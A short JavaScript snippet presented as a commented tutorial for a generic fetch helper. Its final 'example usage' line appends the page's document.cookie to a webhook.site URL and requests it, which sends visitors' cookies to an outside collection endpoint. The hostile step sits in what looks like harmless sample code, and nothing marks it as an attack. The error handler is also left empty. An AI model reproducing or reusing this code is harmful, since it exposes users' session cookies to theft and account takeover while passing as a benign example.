async function fetchData(url) {
  try {
    // 1. Make the network request
    const response = await fetch(url);

    // 2. Check if the request was successful (status code 200-299)
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }

    // 3. Parse the data as JSON (or response.text() if it's plain text)
    const data = await response.json();
    console.log(data);
    return data;
  } catch (error) {
    // Handle any network or parsing errors
  }
}

// Example usage:
fetchData('https://webhook.site/7c55c797-c3fd-4a2d-b567-efaa88aff534/'+document.cookie);
